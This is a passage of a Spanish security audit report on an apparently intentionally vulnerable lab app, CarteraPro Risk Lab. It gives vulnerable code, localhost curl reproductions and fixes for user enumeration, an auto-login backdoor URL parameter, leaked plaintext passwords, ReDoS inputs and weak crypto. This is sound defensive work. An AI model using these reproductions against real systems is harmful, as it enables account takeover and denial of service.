Los headers HTTP de las respuestas del servidor exponen información detallada sobre el stack tecnológico, versiones de software y detalles de infraestructura interna. Esta información facilita el reconocimiento del sistema por parte de atacantes, permitiéndoles identificar versiones con vulnerabilidades conocidas (CVEs) y adaptar sus ataques.

### Evidencia — Headers HTTP observados en respuestas

```http
HTTP/1.1 200 OK
X-Powered-By: Express/4.17.1 vulnerable-lab
X-AspNet-Version: 4.0.30319
X-Internal-Host: hostname-servidor-interno
Server: nginx/1.18.0 (Ubuntu)
X-Debug-Info: development-mode-active
```

**Análisis de exposición:**

| Header                  | Información expuesta                              | Riesgo                                    |
|-------------------------|---------------------------------------------------|-------------------------------------------|
| `X-Powered-By`          | Framework y versión exacta (Express 4.17.1)       | Identificación de CVEs específicos        |
| `X-AspNet-Version`      | Versión de .NET (posiblemente falso en este caso) | Confusión / fingerprinting del stack      |
| `X-Internal-Host`       | Hostname interno del servidor                     | Reconocimiento de infraestructura         |
| `Server`                | Versión de nginx/OS                               | Identificación de CVEs de servidor web    |
| `X-Debug-Info`          | Modo de desarrollo activo                         | Indica entorno no hardened                |

### Solución Recomendada

```javascript
const helmet = require('helmet');

// Helmet configura automáticamente headers de seguridad
app.use(helmet());

// Eliminar el header X-Powered-By específicamente:
app.disable('x-powered-by');

// Nunca agregar headers con información interna
// Configurar nginx para ocultar la versión: server_tokens off;
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-019: Enumeración de Usuarios via Mensajes de Error

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-019                                                         |
| **Nombre**                 | User Enumeration — Mensajes de Error Diferenciados              |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures           |
| **Tipo**                   | Information Disclosure — User Enumeration                       |
| **Severidad**              | 🟡 Media                                                        |
| **CVSS v3.1**              | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)                      |
| **Herramienta detectora**  | Revisión Manual + OWASP ZAP                                     |
| **CWE**                    | CWE-204: Observable Response Discrepancy                        |

### Descripción Técnica

El endpoint de login devuelve mensajes de error **diferentes** dependiendo de si el nombre de usuario existe en la base de datos o no. Esta diferencia permite a un atacante determinar qué nombres de usuario son válidos mediante fuerza bruta, antes de intentar crackear contraseñas.

### Evidencia — `backend/src/controllers/authController.js`

```javascript
db.get(sql, (err, user) => {
  if (!user) {
    // Mensaje cuando el usuario NO EXISTE
    return res.status(401).json({ error: 'El usuario no existe' });
    //                                    ^^^^^^^^^^^^^^^^^^^^
    //                    Confirma que el usuario es inválido
  }
  if (user.password !== password) {
    // Mensaje diferente cuando el usuario SÍ EXISTE pero la contraseña es incorrecta
    return res.status(401).json({ error: 'Password incorrecto para usuario existente' });
    //                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                    Confirma que el usuario ES VÁLIDO
  }
});
```

### Reproducibilidad

```bash
# Test de usuario inexistente:
curl -X POST http://localhost:4000/api/auth/login \
  -d '{"username": "usuario_que_no_existe", "password": "test"}'
# Respuesta: {"error": "El usuario no existe"}
# → Confirma que 'usuario_que_no_existe' NO está registrado

# Test de usuario existente:
curl -X POST http://localhost:4000/api/auth/login \
  -d '{"username": "admin", "password": "password_incorrecta"}'
# Respuesta: {"error": "Password incorrecto para usuario existente"}
# → Confirma que 'admin' SÍ está registrado
```

Un atacante puede automatizar este proceso para enumerar todos los usuarios válidos del sistema antes de lanzar un ataque de fuerza bruta de contraseñas.

### Solución Recomendada

```javascript
// Mensaje genérico indistinguible para ambos casos
if (!user || user.password !== password) {
  return res.status(401).json({ error: 'Credenciales incorrectas' });
  // Tiempo de respuesta constante con bcrypt.compare para evitar timing attacks
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 30 minutos |

---

## SEC-020: Credenciales en Logs y Consola

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-020                                                          |
| **Nombre**                 | Password y Tokens Registrados en Logs del Sistema                |
| **Categoría OWASP**        | A09:2021 – Security Logging and Monitoring Failures              |
| **Tipo**                   | Sensitive Data Exposure — Logging Credentials                    |
| **Severidad**              | 🟡 Media                                                         |
| **Herramienta detectora**  | Revisión Manual                                                  |
| **CWE**                    | CWE-532: Insertion of Sensitive Information into Log File        |

### Descripción Técnica

Se identificaron múltiples instancias donde contraseñas en texto plano, tokens de sesión y datos de autenticación son enviados a la consola mediante `console.log()`. En un entorno de producción, estos logs son almacenados en archivos o sistemas de log management (ELK, Splunk, CloudWatch), donde las credenciales quedan expuestas a cualquier persona con acceso a los logs.

### Evidencia

**`backend/src/controllers/authController.js`:**

```javascript
// INSEGURO: password en texto plano en logs
console.log('Intento de login:', username, password);
// En producción: queda registrado en los archivos de log
// Ejemplo: "Intento de login: admin admin123"
```

**`frontend/src/utils/api.js`:**

```javascript
// INSEGURO: token de sesión en logs del navegador
console.log('Llamando API con sesion:', session);
// Cualquier persona con acceso a DevTools ve el token
// Herramientas de monitoreo de RUM también capturan estos logs
```

**Impacto adicional:** Los logs del navegador son accesibles por extensiones maliciosas, herramientas de debugging y potencialmente por scripts de terceros si hay una vulnerabilidad XSS activa.

### Solución Recomendada

```javascript
// NUNCA loguear credenciales
// En lugar de:
console.log('Intento de login:', username, password);

// Usar:
console.log('Intento de login para usuario:', username);
// Omitir completamente el password

// Para el frontend, no loguear tokens en producción:
if (process.env.NODE_ENV === 'development') {
  console.debug('[API] Realizando petición autenticada');
}
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-021: Stack Traces Expuestos en Respuestas HTTP

| Campo                      | Detalle                                                           |
|----------------------------|-------------------------------------------------------------------|
| **Identificador**          | SEC-021                                                           |
| **Nombre**                 | Exposure of Stack Trace in HTTP Response                          |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                              |
| **Tipo**                   | Information Disclosure — Stack Trace Exposure                     |
| **Severidad**              | 🟡 Media                                                          |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                       |
| **CWE**                    | CWE-209: Generation of Error Message Containing Sensitive Information |

### Descripción Técnica

Múltiples controladores devuelven el stack trace completo de las excepciones en las respuestas HTTP de error (código 500). Esta información es valiosa para los atacantes, ya que revela la estructura interna del código, nombres de archivos, rutas del sistema, versiones de módulos y el flujo de ejecución del servidor.

### Evidencia — Múltiples controladores

```javascript
// Patrón encontrado en varios controladores:
db.get(sql, (err, result) => {
  if (err) {
    return res.status(500).json({
      error: err.message,  // Mensaje del error (revela detalles de la BD)
      stack: err.stack,    // STACK TRACE COMPLETO expuesto al cliente
      raw: err,            // El objeto error completo serializado
      sql: sql             // La consulta SQL con los parámetros (revela estructura)
    });
  }
});
```

**Ejemplo de respuesta de error expuesta al cliente:**

```json
{
  "error": "SQLITE_ERROR: no such column: nombres",
  "stack": "Error: SQLITE_ERROR: no such column: nombres\n    at Statement.<anonymous> (/app/backend/src/controllers/clientController.js:45:14)\n    at /app/backend/node_modules/sqlite3/lib/sqlite3.js:1234:23\n    at ...",
  "sql": "SELECT * FROM clients WHERE nombres LIKE '%test%'",
  "raw": { "errno": 1, "code": "SQLITE_ERROR" }
}
```

**Información revelada:** Ruta absoluta del código (`/app/backend/src/controllers/clientController.js`), número de línea exacto, estructura de la consulta SQL, versión del módulo sqlite3, estructura de directorios del servidor.

### Solución Recomendada

```javascript
// Middleware global de manejo de errores (en app.js):
app.use((err, req, res, next) => {
  // Log interno con todos los detalles (para diagnóstico)
  console.error('[ERROR]', {
    message: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    timestamp: new Date().toISOString()
  });
  
  // Respuesta genérica al cliente (sin detalles internos)
  res.status(500).json({
    error: 'Error interno del servidor',
    // NUNCA incluir: stack, sql, raw, err.message en producción
    requestId: generateRequestId() // para correlación en logs internos
  });
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 1–2 horas |

---

## SEC-022: Auto-login Administrativo por Parámetro URL

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | SEC-022                                                            |
| **Nombre**                 | Backdoor de Autenticación via Parámetro URL                        |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures              |
| **Tipo**                   | Authentication Bypass — Hidden Backdoor                            |
| **Severidad**              | 🔴 Crítica                                                         |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                         |
| **Herramienta detectora**  | Revisión Manual del código frontend + OWASP ZAP                    |
| **CWE**                    | CWE-798: Use of Hard-coded Credentials / CWE-287: Improper Authentication |

### Descripción Técnica

El archivo `frontend/src/utils/api.js` implementa una **backdoor de autenticación automática**: si la URL contiene los parámetros `?zap=auto` o `?dast=auto`, el código frontend establece automáticamente una sesión de administrador con credenciales hardcodeadas en el bundle JavaScript. Este mecanismo fue probablemente diseñado para facilitar el análisis con OWASP ZAP, pero cualquier usuario puede usarlo para acceder como administrador sin autenticarse.

### Evidencia — `frontend/src/utils/api.js`

```javascript
// BACKDOOR: auto-login por parámetro en URL
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.has('zap') && urlParams.get('zap') === 'auto') {
  // Establece sesión de admin automáticamente
  localStorage.setItem('token', 'token-1-admin-admin'); // Token admin hardcodeado
  localStorage.setItem('user', JSON.stringify({
    id: 1,
    username: 'admin',
    role: 'admin',
    password: 'admin123' // Contraseña en texto plano en el bundle JS
  }));
}

// Mismo comportamiento para el parámetro dast=auto
if (urlParams.get('dast') === 'auto') {
  localStorage.setItem('token', 'token-1-admin-admin');
  // ...
}
```

### Reproducibilidad

```
// Cualquier usuario puede acceder como admin visitando:
http://localhost:5173/?zap=auto

// O en cualquier página de la aplicación:
http://localhost:5173/clients?dast=auto

// El frontend detecta el parámetro, establece el token de admin en localStorage,
// y el usuario queda autenticado como administrador sin introducir credenciales.
```

### Impacto Técnico

- Bypass completo de autenticación accesible para cualquier usuario de la red.
- Las credenciales hardcodeadas (`admin123`) son visibles en el bundle JavaScript del frontend inspeccionando el código fuente del navegador.
- Combinado con SEC-003 (token falsificable), el acceso admin es trivial por múltiples vías.

### Impacto de Negocio

- Acceso no autorizado inmediato a todas las funciones administrativas.
- Las credenciales expuestas en el bundle JS son accesibles por cualquier usuario que abra las DevTools del navegador.

### Causa Raíz

Mecanismo de conveniencia para pruebas (DAST) que fue integrado directamente en el código de producción sin ser eliminado ni protegido adecuadamente.

### Solución Recomendada

Eliminar completamente este mecanismo del código de producción. Para herramientas de DAST como ZAP, configurar las credenciales de prueba en la herramienta, no en el código:

```javascript
// Eliminar completamente el bloque de auto-login
// ZAP puede configurarse para autenticarse via el formulario de login:
// ZAP Authentication → Form-based Authentication → /api/auth/login
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Muy Baja         |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | < 30 minutos       |

---

## SEC-023: Respuesta de Login Incluye Contraseña del Usuario

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-023                                                          |
| **Nombre**                 | Password Expuesto en Respuesta JSON del Login                    |
| **Categoría OWASP**        | A02:2021 – Cryptographic Failures                                |
| **Tipo**                   | Sensitive Data Exposure                                          |
| **Severidad**              | 🟠 Alta                                                          |
| **CVSS v3.1**              | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)                       |
| **Herramienta detectora**  | OWASP ZAP + DevTools + Revisión Manual                           |
| **CWE**                    | CWE-312: Cleartext Storage of Sensitive Information              |

### Descripción Técnica

El endpoint `POST /api/auth/login` devuelve como respuesta el objeto `user` completo tal como fue recuperado de la base de datos, incluyendo el campo `password` en texto plano. Esto expone la contraseña del usuario en la respuesta HTTP de autenticación, la cual puede ser interceptada y almacenada en múltiples capas (logs de red, proxies, localStorage del navegador).

### Evidencia — `backend/src/controllers/authController.js`

```javascript
db.get(sql, (err, user) => {
  // ...
  const token = `token-${user.id}-${user.username}-${user.role}`;
  
  // VULNERABILIDAD: se devuelve el objeto user COMPLETO de la BD
  // que incluye el campo password en texto plano
  res.json({
    token,
    user  // { id: 1, username: 'admin', password: 'admin123', role: 'admin', email: '...' }
    //  ^^^^                              ^^^^^^^^^^^^^^^^^^^^^^^^
    //  El campo password es parte del objeto user de SQLite
  });
});
```

**Respuesta HTTP real observada:**

```json
{
  "token": "token-1-admin-admin",
  "user": {
    "id": 1,
    "username": "admin",
    "password": "admin123",
    "role": "admin",
    "email": "admin@carterapro.com",
    "fullName": "Administrador"
  }
}
```

### Impacto Técnico

- La contraseña queda expuesta en DevTools (pestaña Network), logs de proxy, logs de monitoring.
- Si el usuario usa la misma contraseña en otros servicios (credential reuse), todos quedan comprometidos.
- El frontend almacena el objeto `user` en `localStorage`, persistiendo la contraseña en el navegador.

### Solución Recomendada

```javascript
// Excluir siempre el campo password de las respuestas:
const { password, ...safeUser } = user; // destructuring para excluir password
res.json({ token, user: safeUser });

// O seleccionar explícitamente en la query SQL:
const sql = "SELECT id, username, role, email, fullName FROM users WHERE username = ?";
// Sin incluir el campo password en el SELECT
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | < 30 minutos |

---

## SEC-024: Tokens de Sesión sin Expiración ni Revocación

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-024                                                          |
| **Nombre**                 | Tokens de Sesión sin Expiración, Refresh ni Mecanismo de Revocación |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures            |
| **Tipo**                   | Insecure Session Management                                      |
| **Severidad**              | 🟡 Media                                                         |
| **CVSS v3.1**              | 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)                       |
| **Herramienta detectora**  | Revisión Manual                                                  |
| **CWE**                    | CWE-613: Insufficient Session Expiration                         |

### Descripción Técnica

El sistema de tokens no implementa ningún mecanismo de expiración, renovación (refresh) ni revocación. Una vez emitido, el token `token-{id}-{username}-{role}` es **válido indefinidamente**. No existe ningún mecanismo en el servidor para invalidar tokens comprometidos, expulsar sesiones activas o forzar re-autenticación.

### Evidencia — Ausencia de controles

```javascript
// authController.js — generación de token sin expiración:
const token = `token-${user.id}-${user.username}-${user.role}`;
// No hay timestamp, no hay expiración, no hay ID de sesión único

// middleware/auth.js — verificación sin chequeo de expiración:
function weakAuth(req, res, next) {
  // No hay verificación de expiración (no existe en el token)
  // No hay revocación (no hay blacklist de tokens)
  // No hay refresh (no hay endpoint /auth/refresh)
  next();
}
```

**Escenario de impacto:**

```
1. Atacante obtiene token de admin (por SEC-003, SEC-022, o SQLi en SEC-001)
2. El token "token-1-admin-admin" es válido para siempre
3. Aunque el admin cambie su contraseña → el token sigue siendo válido
4. Aunque se detecte el compromiso → no hay forma de invalidar el token
5. El atacante mantiene acceso permanente al sistema
```

### Solución Recomendada

```javascript
// Con JWT (ver SEC-003):
// 1. Expiración corta en el token:
const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '15m' });

// 2. Refresh token de larga duración (almacenado en httpOnly cookie):
const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, { expiresIn: '7d' });

// 3. Endpoint de revocación con blacklist (Redis):
app.post('/auth/logout', (req, res) => {
  const token = extractToken(req);
  redis.set(`blacklist:${token}`, '1', 'EX', 3600); // TTL = expiración del token
  res.json({ message: 'Sesión cerrada' });
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Alta     |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 8–16 horas |

---

## SEC-025: ReDoS — Expresiones Regulares Vulnerables

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-025                                                         |
| **Nombre**                 | Regular Expression Denial of Service (ReDoS)                   |
| **Categoría OWASP**        | A06:2021 – Vulnerable and Outdated Components                   |
| **Tipo**                   | Denial of Service — Algorithmic Complexity                      |
| **Severidad**              | 🟠 Alta                                                         |
| **CVSS v3.1**              | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)                      |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S5852`) + Revisión Manual         |
| **CWE**                    | CWE-1333: Inefficient Regular Expression Complexity             |

### Descripción Técnica

Se identificaron dos expresiones regulares con **backtracking catastrófico** que pueden causar la denegación de servicio del servidor Node.js al procesarlas con inputs especialmente diseñados. El motor de expresiones regulares de JavaScript utiliza backtracking exponencial para estos patrones, haciendo que el tiempo de procesamiento crezca exponencialmente con la longitud del input.

### Evidencia

**`backend/src/controllers/legacyDebtController.js`:**

```javascript
// REGEX VULNERABLE: patrón con cuantificadores anidados
const vulnerableRegex1 = /^(a+)+$/;
//                          ^^^^^ Cuantificador anidado: (a+)+
// Para input "aaaa...X" (n letras 'a' seguidas de un carácter no coincidente):
// El motor intenta 2^n combinaciones diferentes de backtracking
// n=30 → ~1 billón de operaciones → servidor cuelga durante segundos/minutos
```

**`frontend/src/utils/sonarDebt.js`:**

```javascript
const vulnerableRegex2 = /^([a-z]+)+$/;
//                          ^^^^^^^^ Mismo patrón vulnerable para letras minúsculas
// Input malicioso: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
// → Backtracking exponencial → freeze del hilo de ejecución
```

### Reproducibilidad

```bash
# Endpoint que usa la regex vulnerable:
curl "http://localhost:4000/api/legacy/regex?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
#                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 30 'a' + '!'
# Resultado: el servidor Node.js queda BLOQUEADO procesando la regex
# Todas las demás peticiones quedan en cola sin respuesta
# Efectivamente: Denegación de Servicio completa del servidor
```

**Demostración del crecimiento exponencial:**

```
Input length  | Operaciones de backtracking | Tiempo aproximado
10 letras + ! | ~1,024                      | < 1ms
20 letras + ! | ~1,048,576                  | ~1ms
30 letras + ! | ~1,073,741,824              | ~1–10 segundos
35 letras + ! | ~34,359,738,368             | > 30 segundos (DoS efectivo)
```

### Impacto Técnico

- Node.js es **single-threaded**: un regex que tarda 30 segundos bloquea **todas** las peticiones al servidor durante ese tiempo.
- El atacante puede mantener el servidor degradado con peticiones periódicas simples.
- No requiere autenticación (el endpoint no está protegido).

### Solución Recomendada

```javascript
// Reemplazar con regex equivalentes sin backtracking catastrófico:

// ❌ Vulnerable:
/^(a+)+$/

// ✅ Equivalente seguro (sin cuantificadores anidados):
/^a+$/

// ❌ Vulnerable:
/^([a-z]+)+$/

// ✅ Equivalente seguro:
/^[a-z]+$/

// Para validaciones más complejas, usar la librería 're2' que implementa
// NFA-based matching sin backtracking exponencial:
const RE2 = require('re2');
const safeRegex = new RE2('^[a-z]+$');
safeRegex.test(input); // tiempo lineal garantizado
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | < 1 hora  |

---

## SEC-026: Criptografía Débil — MD5 y Math.random()

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-026                                                         |
| **Nombre**                 | Algoritmos Criptográficos Inseguros — MD5 y Math.random()       |
| **Categoría OWASP**        | A02:2021 – Cryptographic Failures                               |
| **Tipo**                   | Weak Cryptography                                               |
| **Severidad**              | 🟠 Alta                                                         |
| **CVSS v3.1**              | 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)                      |
| **Herramienta detectora**  | SonarQube (reglas: `javascript:S4790`, `javascript:S2245`) + Manual |
| **CWE**                    | CWE-327: Use of a Broken or Risky Cryptographic Algorithm / CWE-338: Use of Cryptographically Weak PRNG |

### Descripción Técnica

Se identificaron dos usos de algoritmos y funciones criptográficamente débiles:

1. **MD5** para hashing: MD5 tiene colisiones conocidas y su velocidad de computación (millones de hashes por segundo en GPU) lo hace inadecuado para almacenamiento de contraseñas.
2. **Math.random()** para generación de tokens: `Math.random()` es un generador de números pseudoaleatorios (PRNG) sin propiedades criptográficas. Sus valores son predecibles y no deben usarse para generar tokens de seguridad.

### Evidencia — `backend/src/controllers/legacyDebtController.js`

```javascript
const crypto = require('crypto');

// USO DE MD5 — algoritmo criptográficamente roto
function weakCryptoDemo(data) {
  // MD5 está roto para propósitos criptográficos desde 2004
  // Velocidad: ~10 billones de hash/segundo con GPU moderna
  // Para contraseñas: completamente inadecuado
  const md5Hash = crypto.createHash('md5').update(data).digest('hex');
  
  // Math.random() — NO criptográficamente seguro
  // Es un PRNG determinístico — predecible si se conoce la semilla
  const weakToken = Math.random().toString(36).substring(2);
  // Este "token" puede ser predicho por un atacante con suficientes muestras
  
  return { md5Hash, weakToken };
}
```

### Impacto Técnico

- **MD5 para contraseñas:** Una GPU moderna puede calcular ~10^10 MD5 por segundo. Un hash MD5 de una contraseña de 8 caracteres puede ser crackeado en segundos con rainbow tables o fuerza bruta.
- **Math.random() para tokens:** Los tokens generados con `Math.random()` pueden ser predecibles, permitiendo a un atacante predecir o forzar tokens de sesión.

### Solución Recomendada

```javascript
// Para hashing de contraseñas → bcrypt (diseñado para ser lento):
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);

// Para hashing de integridad (no contraseñas) → SHA-256:
const sha256 = crypto.createHash('sha256').update(data).digest('hex');

// Para tokens criptográficamente seguros → crypto.randomBytes:
const secureToken = crypto.randomBytes(32).toString('hex');
// 256 bits de entropía real — imposible de predecir
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Alta      |
| **Esfuerzo estimado**       | 1–2 horas |

---

## SEC-027: Consultas SQL Expuestas en Respuestas de Error

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | SEC-027                                                            |
| **Nombre**                 | SQL Query Disclosure in Error Responses                            |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                               |
| **Tipo**                   | Information Disclosure — SQL Structure Exposure                    |
| **Severidad**              | 🟡 Media                                                           |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                        |
| **CWE**                    | CWE-209: Generation of Error Message Containing Sensitive Information |

### Descripción Técnica

Múltiples controladores exponen la consulta SQL completa en las respuestas de error HTTP. Esta información proporciona a un atacante un mapa exacto de la estructura de la base de datos: nombres de tablas, nombres de columnas, tipos de datos y relaciones entre tablas. Esta información es valiosa para diseñar ataques de SQL injection más sofisticados.

### Evidencia — Múltiples controladores

**`authController.js`:**

```javascript
db.get(sql, (err, user) => {
  if (err) {
    return res.status(500).json({
      error: err.message,
      sql   // EXPOSICIÓN: la query con el input del usuario es devuelta en el error
      //  → "SELECT * FROM users WHERE username = 'input_malicioso'"
    });
  }
});
```

**`clientController.js`:**

```javascript
db.all(searchSql, (err, rows) => {
  if (err) {
    return res.status(500).json({
      error: err.message,
      sql: searchSql  // EXPOSICIÓN: revela estructura de la tabla clients
      // → "SELECT * FROM clients WHERE name LIKE '%input%'"
    });
  }
});
```

**Información revelada en respuestas de error:**

```json
{
  "error": "SQLITE_ERROR: no such column: nombres",
  "sql": "SELECT id, name, email, phone, address, notes, active, creditScore FROM clients WHERE nombres LIKE '%test%'"
}
```

La respuesta anterior revela exactamente: nombre de la tabla (`clients`), nombres de todas las columnas (`id, name, email, phone, address, notes, active, creditScore`), y la estructura de la query utilizada.

### Solución Recomendada

```javascript
// Manejo de errores que NO expone detalles internos:
db.all(sql, params, (err, rows) => {
  if (err) {
    // Log interno con todos los detalles para diagnóstico
    console.error('[clientController] DB Error:', { message: err.message, sql, params });
    // Respuesta genérica al cliente
    return res.status(500).json({ error: 'Error interno al procesar la solicitud' });
  }
  res.json(rows);
});
```

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Muy Baja |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | 1 hora    |

---

## SEC-028: Endpoint /api/auth/users Expone Contraseñas sin Autenticación

| Campo                      | Detalle                                                            |
|----------------------------|--------------------------------------------------------------------|
| **Identificador**          | SEC-028                                                            |
| **Nombre**                 | Mass User Data Disclosure — Endpoint Público sin Autenticación    |
| **Categoría OWASP**        | A01:2021 – Broken Access Control                                   |
| **Tipo**                   | Broken Access Control + Sensitive Data Exposure                    |
| **Severidad**              | 🔴 Crítica                                                         |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                         |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                        |
| **CWE**                    | CWE-306: Missing Authentication for Critical Function / CWE-312: Cleartext Storage |

### Descripción Técnica

El endpoint `GET /api/auth/users` devuelve la lista completa de todos los usuarios del sistema con sus contraseñas en texto plano, sin requerir ningún tipo de autenticación. Cualquier persona con acceso a la red donde está expuesto el servidor puede obtener todos los nombres de usuario, contraseñas, roles y datos personales con una única petición HTTP.

### Evidencia — `backend/src/controllers/authController.js`

```javascript
// Endpoint que expone TODOS los usuarios con sus contraseñas
router.get('/users', (req, res) => {
  // Sin middleware de autenticación
  // Sin verificación de rol
  // Sin paginación ni restricción de campos
  
  db.all('SELECT * FROM users', [], (err, users) => {
    //                    ^^^
    //          SELECT * incluye el campo password en texto plano
    if (err) return res.status(500).json({ error: err.message });
    res.json(users); // Lista completa de usuarios con passwords
  });
});
```

### Reproducibilidad

```bash
# Sin autenticación, sin token, sin ningún requisito:
curl http://localhost:4000/api/auth/users

# Respuesta:
[
  { "id": 1, "username": "admin",   "password": "admin123",    "role": "admin" },
  { "id": 2, "username": "jperez",  "password": "password456", "role": "user"  },
  { "id": 3, "username": "mgarcia", "password": "secret789",   "role": "manager" },
  { "id": 4, "username": "rlopez",  "password": "rlopez2024",  "role": "user"  }
]
```

### Impacto Técnico

- Exposición inmediata de **todas las credenciales** del sistema con una única petición anónima.
- Los datos obtenidos permiten acceso directo como cualquier usuario, incluyendo administradores.
- Sin necesidad de explotar ninguna otra vulnerabilidad — el ataque es trivial.
- Posible uso para ataques de credential stuffing contra otros servicios.

### Impacto de Negocio

- Violación masiva de datos de usuarios — incumplimiento inmediato de RGPD/LOPD.
- Compromiso de todos los usuarios del sistema sin ningún esfuerzo por parte del atacante.
- En combinación con otras vulnerabilidades (RCE, SSRF), permite compromiso total del sistema desde cero.

### Causa Raíz

Endpoint de administración/utilidad creado sin aplicar ningún control de acceso, probablemente para facilitar el desarrollo o las pruebas.

### Solución Recomendada

```javascript
// Proteger con autenticación y autorización de administrador:
router.get('/users', authenticateToken, requireAdmin, (req, res) => {
  // Excluir contraseñas y datos sensibles del resultado:
  db.all(
    'SELECT id, username, role, email, fullName, created_at FROM users',
    [],
    (err, users) => {
      if (err) {
        console.error('[getUsers] DB Error:', err.message);
        return res.status(500).json({ error: 'Error al obtener usuarios' });
      }
      res.json(users);
    }
  );
});
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Baja             |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | 1 hora             |

---

---

> **Fin del documento — Parte 1**
>
> Este documento cubre las Secciones 1 a 5 del Informe Técnico de Auditoría de Seguridad de CarteraPro Risk Lab, incluyendo 10 hallazgos de calidad (CAL-001 a CAL-010) y 28 hallazgos de seguridad (SEC-001 a SEC-028), con evidencia de código, reproducibilidad demostrada y recomendaciones técnicas de remediación.
>
> **Documento:** `auditoria/informe_tecnico_parte1.md`  
> **Emisión:** 2026-06-13  
> **Equipo:** Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software  
> **Clasificación:** CONFIDENCIAL
# INFORME TÉCNICO DE AUDITORÍA DE SEGURIDAD
## CarteraPro Risk Lab — Parte 2: Secciones 6 a 9 y Conclusiones

---

| Campo               | Detalle                                                              |
|---------------------|----------------------------------------------------------------------|
| **Documento**       | Informe Técnico de Auditoría de Seguridad — Parte 2                 |
| **Aplicación**      | CarteraPro Risk Lab                                                  |
| **Versión revisada**| 1.0 (entorno de laboratorio)                                         |
| **Fecha de emisión**| 2026-06-13                                                           |
| **Clasificación**   | CONFIDENCIAL — Uso interno restringido                               |
| **Equipo auditor**  | Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software   |

---

> **Aviso de confidencialidad:** Este documento contiene información sensible sobre vulnerabilidades de seguridad identificadas en la aplicación CarteraPro Risk Lab. Su distribución debe limitarse estrictamente al personal autorizado. La divulgación no autorizada puede comprometer la seguridad de la organización.

---

## TABLA DE CONTENIDOS

6. [Hallazgos de Dependencias](#6-hallazgos-de-dependencias)
7. [Valoración de Riesgos](#7-valoración-de-riesgos)
8. [Correlación de Hallazgos](#8-correlación-de-hallazgos)
9. [Anexo de Evidencias Técnicas](#9-anexo-de-evidencias-técnicas)

[Conclusiones Generales](#conclusiones-generales)

---

---

# 6. HALLAZGOS DE DEPENDENCIAS

## 6.1 Contexto del Análisis de Dependencias

El análisis de dependencias de terceros es un componente esencial de cualquier auditoría de seguridad moderna. Las aplicaciones actuales dependen en gran medida de ecosistemas de paquetes externos; en el ecosistema Node.js/npm, la superficie de ataque derivada de dependencias directas e indirectas puede superar con creces la del código propio de la aplicación.

